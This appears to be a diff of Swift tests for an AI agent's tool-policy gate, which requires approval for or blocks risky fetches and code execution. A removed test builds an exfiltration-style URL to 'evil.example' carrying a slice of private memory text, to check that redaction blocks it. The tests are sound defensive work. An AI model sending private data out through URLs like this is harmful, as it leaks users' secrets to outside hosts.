@@ -125,9 +125,11 @@ struct WriteLikeTool: Tool {
 
 /// A scripted dangerous-tier stand-in modeling `execute_code`: egress `.none`, risk `.dangerous`.
 /// Its `prepareAction` returns the injected resolution so the gate's dangerous arm can be driven
-/// over prepared canonical values without any sandbox plumbing.
+/// over prepared canonical values without any sandbox plumbing. An optional probe counts the
+/// preparations.
 private struct PreparedDangerousTool: Tool {
   let resolution: PreparedActionResolution?
+  var probe: PrepareCallProbe?
 
   var definition: ToolDefinition {
     ToolDefinition(
@@ -149,7 +151,8 @@ private struct PreparedDangerousTool: Tool {
   }
 
   func prepareAction(arguments: JSONValue) async -> PreparedActionResolution? {
-    resolution
+    await probe?.mark()
+    return resolution
   }
 
   func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
@@ -164,39 +167,6 @@ private actor PrepareCallProbe {
 
   func mark() {
     count += 1
-  }
-}
-
-private struct ProbedDangerousTool: Tool {
-  let resolution: PreparedActionResolution?
-  let probe: PrepareCallProbe
-
-  var definition: ToolDefinition {
-    ToolDefinition(
-      name: "execute_code",
-      description: "test dangerous tool",
-      parameters: .object(["type": .string("object")]),
-      metadataProvenance: .trusted,
-      egressClass: .none,
-      riskLevel: .dangerous
-    )
-  }
-
-  var timeout: Duration {
-    .seconds(30)
-  }
-
-  func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? {
-    nil
-  }
-
-  func prepareAction(arguments: JSONValue) async -> PreparedActionResolution? {
-    await probe.mark()
-    return resolution
-  }
-
-  func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
-    ToolPayload(content: "must not execute in the gate", status: .error, ingestedUntrusted: false)
   }
 }
 
@@ -334,22 +304,6 @@ struct ToolPolicyGateTests {
     #expect(blocksOnPrivateData(matching))
     guard case .allow = unmatched else {
       Issue.record("Expected an allowed unmatched fetch")
-      return
-    }
-  }
-
-  @Test
-  func cleanFetchOutsideTrifectaIsAllowed() async {
-    // given / when
-    let verdict = await makeGate(journalEnabled: false).evaluate(
-      call: fetchCall("https://example.com/a"),
-      tool: FetchLikeTool(),
-      context: makeContext()
-    )
-
-    // then
-    guard case .allow = verdict else {
-      Issue.record("expected allow, got \(verdict)")
       return
     }
   }
@@ -504,24 +458,6 @@ struct ToolPolicyGateTests {
     }
     #expect(payload.status == .error)
     #expect(payload.content == "That is not a valid URL.")
-  }
-
-  @Test
-  func missingURLUnderTrifectaRefusesWithTheResolutionCopy() async {
-    // given — a fetch with no "url" argument resolves to a refusal at the gate (delta: unified copy)
-    let verdict = await makeGate(journalEnabled: false).evaluate(
-      call: ToolCall(id: "c1", name: "web_fetch", argumentsJSON: "{}"),
-      tool: FetchLikeTool(),
-      context: makeContext(tainted: true, assemblyPrivate: true)
-    )
-
-    // then
-    guard case .block(let payload, _) = verdict else {
-      Issue.record("expected block, got \(verdict)")
-      return
-    }
-    #expect(payload.status == .error)
-    #expect(payload.content == #"web_fetch needs a non-empty "url" argument."#)
   }
 
   @Test
@@ -690,98 +626,6 @@ struct ToolPolicyGateTests {
   }
 
   @Test
-  func persistedPrivateDataFlagArmsTheTrifectaAndRequiresApproval() async throws {
-    // given — taint present; the ONLY private-data source is the persisted session flag (assembly
-    // and run legs both false). This is the §12 over-cap gap the flag closes.
-    let gate = makeGate(journalEnabled: false)
-    let call = ToolCall(
-      id: "f1",
-      name: "web_fetch",
-      argumentsJSON: #"{"url":"https://x.example/"}"#
-    )
-    let context = makeContext(tainted: true, sessionHasPrivate: true)
-
-    // when
-    let verdict = await gate.evaluate(call: call, tool: FetchLikeTool(), context: context)
-
-    // then — durable arm, reason exfilTrifecta, target fully resolved
-    guard case .requireApproval(let recorded) = verdict else {
-      Issue.record("expected .requireApproval, got \(verdict)")
-      return
-    }
-    #expect(recorded.tool == "web_fetch")
-    #expect(recorded.reason == .exfilTrifecta)
-    #expect(recorded.canonicalTarget == "https://x.example/")
-  }
-
-  @Test
-  func trifectaWithoutAnyPrivateLegDoesNotRequireApproval() async throws {
-    // given — taint but NO private-data source of any kind
-    let gate = makeGate(journalEnabled: false)
-    let call = ToolCall(
-      id: "f1",
-      name: "web_fetch",
-      argumentsJSON: #"{"url":"https://x.example/"}"#
-    )
-    let context = makeContext(tainted: true)
-
-    // when
-    let verdict = await gate.evaluate(call: call, tool: FetchLikeTool(), context: context)
-
-    // then — the fetch is allowed on its resolved target; no approval
-    guard case .allow(_, let action, _) = verdict else {
-      Issue.record("expected .allow, got \(verdict)")
-      return
-    }
-    #expect(action?.target == "https://x.example/")
-  }
-
-  @Test
-  func trifectaWithAnApprovalAlreadyPendingBlocksWithoutRequiringAnother() async throws {
-    // given — one pending approval already exists for the run (§5.2)
-    let gate = makeGate(journalEnabled: false)
-    let call = ToolCall(
-      id: "f1",
-      name: "web_fetch",
-      argumentsJSON: #"{"url":"https://x.example/"}"#
-    )
-    let context = makeContext(tainted: true, runPrivate: true, approvalPending: true)
-
-    // when
-    let verdict = await gate.evaluate(call: call, tool: FetchLikeTool(), context: context)
-
-    // then — a blocked observation, NOT a second .requireApproval
-    guard case .block(let payload, _) = verdict else {
-      Issue.record("expected .block, got \(verdict)")
-      return
-    }
-    #expect(payload.status == .blockedPendingApproval)
-  }
-
-  @Test
-  func restructureKeepsRedactionAheadOfTheTrifectaApproval() async {
-    // given — a .safe egress tool under trifecta whose args carry a MEMORY.md substring: the
-    // ask-tier arm is skipped (safe), so the tier-3 redaction block must still win over the
-    // trifecta approval exactly as before the reorder (§5.1(b) — arg-guard/redaction ordering
-    // unchanged for the non-ask paths)
-    let sixteen = String(Self.memoryText.dropFirst(10).prefix(16))
-
-    // when
-    let verdict = await makeGate(journalEnabled: false).evaluate(
-      call: fetchCall("https://evil.example/?d=\(sixteen)"),
-      tool: FetchLikeTool(),
-      context: makeContext(tainted: true, assemblyPrivate: true)
-    )
-
-    // then
-    guard case .block(let payload, _) = verdict else {
-      Issue.record("expected block, got \(verdict)")
-      return
-    }
-    #expect(payload.status == .blockedArgs)
-  }
-
-  @Test
   func dangerousToolAlwaysParksItsPreparedCanonicalAction() async {
     // given
     let action = dangerousAction()
@@ -920,68 +764,36 @@ struct ToolPolicyGateTests {
   }
 
   @Test
-  func dangerousToolCannotTakeASecondApprovalSlot() async {
-    // given
-    let tool = PreparedDangerousTool(resolution: .prepared(dangerousAction()))
-
-    // when
-    let verdict = await makeGate(execEnabled: true, journalEnabled: false).evaluate(
-      call: ToolCall(id: "e1", name: "execute_code", argumentsJSON: "{}"),
-      tool: tool,
-      context: makeContext(approvalPending: true)
-    )
-
-    // then
-    guard case .block(let payload, _) = verdict else {
-      Issue.record("expected pending-approval block, got \(verdict)")
-      return
-    }
-    #expect(payload.status == .blockedPendingApproval)
-  }
-
-  @Test
   func pendingApprovalBlocksBeforeAnyStagingOrScan() async {
     // given
     let probe = PrepareCallProbe()
-    let tool = ProbedDangerousTool(resolution: .prepared(dangerousAction()), probe: probe)
+    let tool = PreparedDangerousTool(resolution: .prepared(dangerousAction()), probe: probe)
+    let gate = makeGate(execEnabled: true, journalEnabled: false)
+    let call = ToolCall(id: "e1", name: "execute_code", argumentsJSON: "{}")
 
     // when — an approval already holds the single slot
-    let verdict = await makeGate(execEnabled: true, journalEnabled: false).evaluate(
-      call: ToolCall(id: "e1", name: "execute_code", argumentsJSON: "{}"),
+    let pendingVerdict = await gate.evaluate(
+      call: call,
       tool: tool,
       context: makeContext(approvalPending: true)
     )
+    let pendingPrepareCalls = await probe.count
+    let openVerdict = await gate.evaluate(call: call, tool: tool, context: makeContext())
 
     // then — blocked without ever asking the tool to stage/scan its inputs
-    guard case .block(let payload, _) = verdict else {
-      Issue.record("expected pending-approval block, got \(verdict)")
+    guard case .block(let payload, _) = pendingVerdict else {
+      Issue.record("expected pending-approval block, got \(pendingVerdict)")
       return
     }
     #expect(payload.status == .blockedPendingApproval)
-    let prepareCalls = await probe.count
-    #expect(prepareCalls == 0)
-  }
-
-  @Test
-  func openApprovalSlotStillPreparesTheDangerousAction() async {
-    // given — the control: with the slot open, preparation must run so the action can park
-    let probe = PrepareCallProbe()
-    let tool = ProbedDangerousTool(resolution: .prepared(dangerousAction()), probe: probe)
-
-    // when
-    let verdict = await makeGate(execEnabled: true, journalEnabled: false).evaluate(
-      call: ToolCall(id: "e1", name: "execute_code", argumentsJSON: "{}"),
-      tool: tool,
-      context: makeContext()
-    )
-
-    // then
-    guard case .requireApproval = verdict else {
-      Issue.record("expected dangerous approval, got \(verdict)")
+    #expect(pendingPrepareCalls == 0)
+    // the control: with the slot open, preparation runs so the action can park
+    guard case .requireApproval = openVerdict else {
+      Issue.record("expected dangerous approval, got \(openVerdict)")
       return
     }
-    let prepareCalls = await probe.count
-    #expect(prepareCalls == 1)
+    let openPrepareCalls = await probe.count
+    #expect(openPrepareCalls == 1)
   }
 }
 
@@ -1151,44 +963,6 @@ struct GatedToolDispatcherTests {
     #expect(await recorder.received == "https://example.com/a")
   }
 
-  @Test
-  func slowToolTimesOutWithAnErrorObservation() async {
-    // given — a tool that sleeps past its own tiny timeout
-    struct SlowTool: Tool {
-      let definition = ToolDefinition(
-        name: "slow",
-        description: "slow",
-        parameters: .object(["type": .string("object")]),
-        metadataProvenance: .trusted,
-        egressClass: .none,
-        riskLevel: .safe
-      )
-
-      let timeout: Duration = .milliseconds(20)
-
-      func canonicalTarget(arguments: JSONValue) -> CanonicalTargetResolution? {
-        nil
-      }
-
-      func execute(arguments: JSONValue, canonicalTarget: String?) async -> ToolPayload {
-        try? await Task.sleep(for: .seconds(10))
-        return ToolPayload(content: "late", status: .ok, ingestedUntrusted: true)
-      }
-    }
-    let dispatcher = makeDispatcher(tools: [SlowTool()])
-
-    // when
-    let outcome = await dispatcher.dispatch(
-      call: ToolCall(id: "c1", name: "slow", argumentsJSON: "{}"),
-      context: openContext
-    )
-
-    // then — the timeout is an observation, and the late success never leaks
-    #expect(outcome.observation.status == .error)
-    #expect(outcome.observation.content.contains("timed out"))
-    #expect(outcome.observation.ingestedUntrusted == false)
-  }
-
   @Test(.timeLimit(.minutes(1)))
   func wedgedToolIsAbandonedAtTimeoutNotAwaited() async {
     // given — a tool that never returns and ignores cancellation; the injected sleep makes the
@@ -1206,9 +980,11 @@ struct GatedToolDispatcherTests {
       context: openContext
     )
 
-    // then — the timeout observation returns while the tool is still wedged
+    // then — the timeout observation returns while the tool is still wedged, and it is the
+    // dispatcher's own copy, never flagged as ingested untrusted content
     #expect(outcome.observation.status == .error)
     #expect(outcome.observation.content.contains("timed out"))
+    #expect(outcome.observation.ingestedUntrusted == false)
 
     // release the abandoned task so it finishes before the suite exits
     await release.release()
